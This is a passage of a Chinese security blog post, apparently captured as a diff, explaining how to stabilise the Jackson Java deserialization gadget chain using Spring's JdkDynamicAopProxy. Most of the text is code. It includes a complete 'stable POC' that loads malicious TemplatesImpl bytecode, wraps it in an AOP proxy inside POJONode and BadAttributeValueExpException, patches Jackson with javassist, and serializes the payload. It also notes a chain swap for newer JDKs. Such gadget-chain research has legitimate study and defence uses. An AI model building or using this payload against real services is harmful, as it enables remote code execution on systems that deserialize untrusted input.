*/</span></span><br></pre></td></tr></table></figure>
+
+<p>这是JSON1的调用链</p>
+<p>net.sf.json.JSONObject#defaultBeanProcessing尝试调用包裹对象的所有getter,但是可以看到它没有直接包裹TemplatesImpl,而是包裹的JdkDynamicAopProxy这个handler</p>
+<p>看看这个handler的invoke</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Implementation of &#123;<span class="doctag">@code</span> InvocationHandler.invoke&#125;.</span></span><br><span class="line"><span class="comment">     * &lt;p&gt;Callers will see exactly the exception thrown by the target,</span></span><br><span class="line"><span class="comment">     * unless a hook method throws an exception.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="meta">@Nullable</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">oldProxy</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">setProxyContext</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">TargetSource</span> <span class="variable">targetSource</span> <span class="operator">=</span> <span class="built_in">this</span>.advised.targetSource;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">target</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">      ...</span><br><span class="line">            <span class="comment">// Get as late as possible to minimize the time we &quot;own&quot; the target,</span></span><br><span class="line">            <span class="comment">// in case it comes from a pool.</span></span><br><span class="line">            target = targetSource.getTarget();</span><br><span class="line">            Class&lt;?&gt; targetClass = (target != <span class="literal">null</span> ? target.getClass() : <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Get the interception chain for this method.</span></span><br><span class="line">            List&lt;Object&gt; chain = <span class="built_in">this</span>.advised.getInterceptorsAndDynamicInterceptionAdvice(method, targetClass);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Check whether we have any advice. If we don&#x27;t, we can fall back on direct</span></span><br><span class="line">            <span class="comment">// reflective invocation of the target, and avoid creating a MethodInvocation.</span></span><br><span class="line">            <span class="keyword">if</span> (chain.isEmpty()) &#123;</span><br><span class="line">                <span class="comment">// We can skip creating a MethodInvocation: just invoke the target directly</span></span><br><span class="line">                <span class="comment">// Note that the final invoker must be an InvokerInterceptor so we know it does</span></span><br><span class="line">                <span class="comment">// nothing but a reflective operation on the target, and no hot swapping or fancy proxying.</span></span><br><span class="line">                Object[] argsToUse = AopProxyUtils.adaptArgumentsIfNecessary(method, args);</span><br><span class="line">                retVal = AopUtils.invokeJoinpointUsingReflection(target, method, argsToUse);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                ...</span><br><span class="line">            &#125;</span><br><span class="line">            ...</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> retVal;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">finally</span> &#123;</span><br><span class="line">            ...</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>这个类的advised字段类型为AdvisedSupport,其targetsource储存着所代理接口的实现类,代理类调用方法时会把调用实现类对应的方法，而TemplatesImpl接口Templates只有一个get方法，就是getOutputProperties,所以就能稳定触发了</p>
+<p>放到Jackson链里也是同理，把handler为JdkDynamicAopProxy的代理对象放进POJONode里</p>
+<p>稳定版POC</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Jackson</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NotFoundException, IOException, CannotCompileException, NoSuchFieldException, ClassNotFoundException, InvocationTargetException, NoSuchMethodException, InstantiationException, IllegalAccessException &#123;</span><br><span class="line">        changeMethodName(<span class="string">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>,<span class="string">&quot;writeReplace&quot;</span>,<span class="string">&quot;dashingBug&quot;</span>);</span><br><span class="line"><span class="comment">//        delMethod(&quot;com.fasterxml.jackson.databind.node.BaseJson  Node&quot;,&quot;writeReplace&quot;);</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesImpl</span> <span class="operator">=</span> getTemplatesImpl();</span><br><span class="line">        <span class="type">AdvisedSupport</span> <span class="variable">addvisedSupport</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AdvisedSupport</span>();</span><br><span class="line">        addvisedSupport.setTarget(templatesImpl);</span><br><span class="line">        <span class="type">Templates</span> <span class="variable">templates</span> <span class="operator">=</span> getProxy(Templates.class, addvisedSupport);</span><br><span class="line">        <span class="type">POJONode</span> <span class="variable">jsonNodes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">POJONode</span>(templates);</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="string">&quot;bug&quot;</span>);</span><br><span class="line">        setField(badAttributeValueExpException, <span class="string">&quot;val&quot;</span>, jsonNodes);</span><br><span class="line">        serial(badAttributeValueExpException);</span><br><span class="line"><span class="comment">//        deserial(serial);</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> TemplatesImpl <span class="title function_">getTemplatesImpl</span><span class="params">()</span> <span class="keyword">throws</span> NoSuchFieldException, NotFoundException, IOException, CannotCompileException &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">byte</span>[] bytes = pool.get(<span class="string">&quot;org.example.springjava8.Evil&quot;</span>).toBytecode();</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">templatesImplClass</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        setField(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;dashing&quot;</span>);</span><br><span class="line">        setField(templates,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        setField(templates,<span class="string">&quot;_tfactory&quot;</span>,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        <span class="keyword">return</span> templates;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setField</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> NoSuchFieldException &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            field.set(obj, value);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span>  <span class="title function_">serial</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;D:/bug666&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">deserial</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes);</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream).readObject();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">delMethod</span><span class="params">(String classname,String originName)</span> <span class="keyword">throws</span> NotFoundException, CannotCompileException &#123;</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> ClassPool.getDefault().get(classname);</span><br><span class="line">        <span class="type">CtMethod</span> <span class="variable">ctMethod</span> <span class="operator">=</span> ctClass.getDeclaredMethod(originName);</span><br><span class="line">        ctClass.removeMethod(ctMethod);</span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader();</span><br><span class="line">        ctClass.toClass(classLoader,<span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">changeMethodName</span><span class="params">(String classname,String originName,String newName)</span> <span class="keyword">throws</span> NotFoundException, CannotCompileException &#123;</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> ClassPool.getDefault().get(classname);</span><br><span class="line">        <span class="type">CtMethod</span> <span class="variable">ctMethod</span> <span class="operator">=</span> ctClass.getDeclaredMethod(originName);</span><br><span class="line">        ctMethod.setName(newName);</span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader();</span><br><span class="line">        ctClass.toClass(classLoader,<span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span>  <span class="keyword">static</span> Templates <span class="title function_">getProxy</span><span class="params">(Class interfaces,AdvisedSupport ad)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException &#123;</span><br><span class="line">        Class[] clazz = <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;interfaces&#125;;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">aop</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> aop.getConstructor(<span class="keyword">new</span>  <span class="title class_">Class</span>[]&#123;AdvisedSupport.class&#125;);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">aopproxy</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(ad);</span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader();</span><br><span class="line">        <span class="type">Templates</span> <span class="variable">templates</span> <span class="operator">=</span> (Templates) Proxy.newProxyInstance(classLoader,clazz,aopproxy);</span><br><span class="line">        <span class="keyword">return</span> templates;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>jdk高版本BadAttribute不能用，将他换成EventListener那条链子就行，toString之后还是一样的</p>
+<p>梳理一下Jackson: BadAttribute#readObject-&gt;POJONode#toString-&gt;JdkDynamicAopProxy#invoke-&gt;TemplatesImpl#getOutputProperties</p>
+<p>参考文章：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/12292">从JSON1链中学习处理JACKSON链的不稳定性-先知社区</a></p>
+
+  </div>
+
+  
+  <div class="about">
+    <h1>About this Post</h1>
+    <div class="details">
+      <p>This post is written by DashingBug, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
+    </div>
+    
+  </div>
+  
+
+  <div class="container post-prev-next">
+    <a class="next"></a>
+    
+    <a href="/2025/09/17/Spring%E9%80%9A%E6%9D%80%E9%AB%98%E7%89%88%E6%9C%ACjdk/" class="prev">
+      <div class="text">
+        <p class="label">Previous</p>
+        <h3 class="title">Spring原生链通杀高版本jdk</h3>
+      </div>
+    </a>
+    
+  </div>
+
+  
+    
+    
+  
+</article>
+
+
+    </main>
+    <footer>
+  <div class="inner">
+    <div class="links">
+      
+      <div class="group">
+        <h2 class="title">Blog</h2>
+        
+        <a href="/" class="item">Home</a>
+        
+        <a href="/archives" class="item">Archives</a>
+        
+        <a href="/tags" class="item">Tags</a>
+        
+        <a href="/categories" class="item">Categories</a>
+        
+        <a href="/search" class="item">Search</a>
+        
+        <a href="/links" class="item">link</a>
+        
+        <a href="/projects" class="item">Projects</a>
+        
+        <a href="/resume" class="item">Resume</a>
+        
+        <a href="/about" class="item">About</a>
+        
+        <a href="/atom.xml" class="item">RSS</a>
+        
+      </div>
+      
+      <div class="group">
+        <h2 class="title">Projects</h2>
+        
+        <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/hexo-theme-cupertino" class="item">Hexo Theme Cupertino</a>
+        
+        <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/next-mastodon-gallery" class="item">Next Mastodon Gallery</a>
+        
+      </div>
+      
+      <div class="group">
+        <h2 class="title">Me</h2>
+        
+        <a target="_blank" rel="noopener" href="https://github.com/MrWillCom" class="item">GitHub</a>
+        
+        <a target="_blank" rel="noopener" href="https://codepen.io/mrwillcom" class="item">CodePen</a>
+        
+        <a target="_blank" rel="noopener" href="https://www.patreon.com/MrWillCom" class="item">Patreon</a>
+        
+        <a target="_blank" rel="noopener" href="https://noc.social/@MrWillCom" class="item">Mastodon</a>
+        
+        <a href="mailto:mr.will.com@outlook.com" class="item">Email</a>
+        
+      </div>
+      
+    </div>
+    <span>&copy; 2025 DashingBug<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></span>
+    
+    
+      <br>
+      <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
+        <label>
+          <input type="radio" value="light">
+          <span>Light</span>
+        </label>
+        <label>
+          <input type="radio" value="dark">
+          <span>Dark</span>
+        </label>
+        <label>
+          <input type="radio" value="auto">
+          <span>Auto</span>
+        </label>
+      </div>
+    
+  </div>
+</footer>
+
+
+    
+<script src="/js/main.js"></script>
+
+
+    
+
+    
+    
+<script src="/js/scroll-reveal.js"></script>
+
+    
+
+    
+
+    
+
+    
+  </body>
+</html>
